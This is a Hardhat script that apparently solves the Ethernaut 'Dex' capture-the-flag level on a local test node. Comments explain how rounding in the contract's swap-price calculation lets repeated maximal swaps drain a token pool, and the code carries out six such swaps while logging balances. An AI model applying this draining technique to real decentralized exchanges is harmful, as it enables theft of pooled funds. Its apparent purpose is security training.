import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x3fbe8483798E4458A39c1CFcd9204fdf6ddf34B7";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Dex", CONTRACT_ADDRESS, signer);


//HACK STEPS
// When we are using swap() function, the amount of tokens of the other pair are obtained via getSwapPrice() function. 
//This function computes price with a division between current balances of these two tokens in the Dex contract.
// This leads to losing track of some amount that is being rounded, and combined with maxing the swaps, sooner or later these inaccuracies make the pool drained.

// Getting prices or any sort of data from any single source is a massive attack vector in smart contracts.
// You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, 
// and cause any applications relying on it to use the the wrong price. The exchange itself is decentralized, but the price of the asset is centralized.

// 1. Check initial balances of Dex contract

const token1 =  await contract.token1();
const token2 =  await contract.token2();
console.log("Token 1: ", token1);
console.log("Token 2: ", token2);

let dexToken1Balance = await contract.balanceOf(token1, contract.address);
let dexToken2Balance = await contract.balanceOf(token2, contract.address);
let myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
let myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("DEX Token 1 balance: ", dexToken1Balance);
console.log("DEX Token 2 balance: ", dexToken2Balance);
console.log("my Token 1 balance: ", myToken1Balance);
console.log("my Token 2 balance: ", myToken2Balance);

// 2. Approve token spendance 
await contract.approve(contract.address,1000000);

// 3. Call swap function and check balances again. 
await contract.swap(token1, token2, myToken1Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("1 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("1 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("1 swap, my Token 1 balance: ", myToken1Balance);
console.log("1 swap, my Token 2 balance: ", myToken2Balance);

// 4. Swap again until one of the dex pools get drained
await contract.swap(token2, token1, myToken2Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("2 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("2 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("2 swap, my Token 1 balance: ", myToken1Balance);
console.log("2 swap, my Token 2 balance: ", myToken2Balance);

await contract.swap(token1, token2, myToken1Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("3 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("3 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("3 swap, my Token 1 balance: ", myToken1Balance);
console.log("3 swap, my Token 2 balance: ", myToken2Balance);

await contract.swap(token2, token1, myToken2Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("4 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("4 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("4 swap, my Token 1 balance: ", myToken1Balance);
console.log("4 swap, my Token 2 balance: ", myToken2Balance);

await contract.swap(token1, token2, myToken1Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("5 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("5 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("5 swap, my Token 1 balance: ", myToken1Balance);
console.log("5 swap, my Token 2 balance: ", myToken2Balance);

await contract.swap(token2, token1, dexToken2Balance);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("6 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("6 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("6 swap, my Token 1 balance: ", myToken1Balance);
console.log("6 swap, my Token 2 balance: ", myToken2Balance);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
